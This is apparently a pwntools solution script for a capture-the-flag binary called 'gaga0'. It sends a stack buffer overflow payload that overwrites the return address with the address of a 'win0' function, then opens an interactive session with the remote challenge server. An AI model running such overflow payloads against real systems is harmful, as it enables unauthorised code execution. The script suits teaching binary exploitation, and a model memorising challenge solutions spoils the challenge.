from pwn import *

e = ELF("./gaga0")
libc = ELF("./libc.so.6")

context.terminal=["konsole", "-e"]

p = remote("challs.actf.co", 31300)
# p = process(["./gaga0"])

p.sendlineafter(": ", "A"*(56+16) + p64(e.sym["win0"]))


p.interactive()
